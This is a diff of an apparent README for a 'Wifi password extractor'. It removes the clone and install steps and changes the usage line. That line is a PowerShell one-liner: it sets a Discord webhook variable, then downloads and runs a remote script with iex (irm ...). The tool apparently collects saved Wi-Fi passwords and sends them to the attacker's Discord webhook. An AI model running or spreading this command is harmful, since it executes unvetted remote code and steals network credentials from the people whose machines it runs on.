@@ -38,23 +38,9 @@
 <hr>
 <h2>Getting Started</h2>
 
-<h3>Installation</h3>
-<p>Build Wifi password extractor from the source and install dependencies:</p>
-<ol>
-<li class="my-0">
-<p><strong>Clone the repository:</strong></p>
-<pre><code class="language-sh">❯ git clone https://github.com/Skibidikubek/Wifi
-</code></pre>
-</li>
-<li class="my-0">
-<p><strong>Navigate to the project directory:</strong></p>
-<pre><code class="language-sh">❯ cd Wifi
-</code></pre>
-</li>
-</ol>
 <h3>Usage</h3>
 <p>Run the project with:</p>
-<pre><code class="language-sh">❯ powershell $WEBHOOK="your discord webhook"; iex (irm "https://raw.githubusercontent.com/TwojUser/WifiPass/main/E.ps1")
+<pre><code class="language-sh">❯ powershell $WEBHOOK="your discord webhook"; iex (irm "https://raw.githubusercontent.com/Skibidikubek/Wifi/refs/heads/main/E.ps1")
 </code></pre>
 
 <hr>
